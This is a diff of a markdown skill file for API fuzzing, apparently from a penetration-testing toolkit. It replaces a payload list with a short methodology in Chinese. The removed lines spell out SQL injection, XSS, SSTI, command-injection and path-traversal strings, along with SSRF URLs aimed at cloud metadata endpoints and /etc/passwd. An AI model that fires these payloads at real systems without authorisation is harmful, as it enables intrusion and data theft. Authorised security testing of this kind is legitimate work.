@@ -1,100 +1,34 @@
 ---
 name: api-fuzz
 description: >
-  API semantic fuzzing payload templates. Provides intelligent
-  payload selection based on parameter semantic type rather
-  than blind fuzzing. Covers IDOR, SQLi, XSS, SSRF, SSTI,
-  command injection, and business logic payloads.
+  Explore API behavior using real parameters and values before generic
+  fuzzing.
 metadata:
-  tags: "api,fuzz,payloads,idor,sqli,xss,ssrf,ssti"
-  category: "offensive-security"
+  tags: "api,fuzz,semantic"
 ---
 
-# API Fuzz Payloads — By Parameter Semantic Type
+# API Fuzz
 
-## ID/Number Type Parameters
-```
-id=1,2,3,100,999999
-id=null  id=0  id=-1  id[]=1  id[]=1&id[]=2
-id[$gt]=0  id[$ne]=1  id[$regex]=.*
-```
+## Goal
 
-## URL/Path/File Type Parameters
-```
-# SSRF
-url=http://127.0.0.1
-url=http://[::1]
-url=http://169.254.169.254/latest/meta-data/   (AWS)
-url=http://metadata.google.internal/            (GCP)
-url=file:///etc/passwd
-url=gopher://127.0.0.1:25/
-url=dict://127.0.0.1:6379/
+理解接口行为、参数语义和响应差异，找出能继续串联的异常。
 
-# Path traversal
-file=../../../etc/passwd
-file=....//....//....//etc/passwd
-file=/etc/passwd%00.jpg
-file=php://filter/convert.base64-encode/resource=index.php
-```
+## Tools / Inputs
 
-## Search/Query Type Parameters
-```
-# SQLi
-q=1' OR '1'='1
-q=1' UNION SELECT 1,2,3--
-q=1' AND SLEEP(5)--
-q=1'; WAITFOR DELAY '0:0:5'--
+- Endpoint signatures、auth hints、value pool、response diffs
+- 参考：`references/api-testing-methodology.md`、`references/api-fuzz-payloads.md`
 
-# XSS
-q=<script>alert(1)</script>
-q=<img src=x onerror=alert(1)>
-q=<svg onload=alert(1)>
-q=javascript:alert(1)
-```
+## Constraints
 
-## Template/Content Type Parameters
-```
-# SSTI
-template={{7*7}}
-template={{config}}
-template=${{7*7}}
-template=<%= 7*7 %>
-```
+1. 真实参数和真实值优先，payload 字典最后用。
+2. 区分正常业务返回和越权返回。
+3. 每次异常都要问它能否导向更高影响。
+4. 控制速率，避免因探测破坏后续机会。
+5. 负结果必须记录。
 
-## Command Type Parameters
-```
-cmd=; id
-cmd=| id
-cmd=`id`
-cmd=$(id)
-cmd=|| id
-cmd=& id
-cmd=\n id
-```
+## Chain Questions
 
-## Amount/Price/Quantity Type Parameters
-```
-# Business logic
-amount=0  amount=-1  amount=0.01
-quantity=0  quantity=-1  quantity=999999
-price=0  price=0.00
-```
-
-## Parameter Discovery Methods
-
-```bash
-# Method 1: Append params, watch response size
-for param in id uid page limit search q role status; do
-    len=$(curl -s "$BASE?$param=1" | wc -c)
-    echo "$param → $len bytes"
-done
-
-# Method 2: POST empty JSON, read error
-curl -s -X POST "$BASE" -H "Content-Type: application/json" -d '{}'
-# "missing required field: username" → param name leaked
-
-# Method 3: Content-Type variants
-curl -X POST "$BASE" -H "Content-Type: application/json" -d '{"id":1}'
-curl -X POST "$BASE" -H "Content-Type: application/xml" -d '<id>1</id>'
-curl -X POST "$BASE" -H "Content-Type: application/x-www-form-urlencoded" -d 'id=1'
-```
+- 参数能否影响数据范围、角色、租户或导出？
+- 响应差异是否泄露权限边界？
+- 新字段能否进入 value pool？
+- 当前异常更像漏洞、配置问题，还是正常业务？
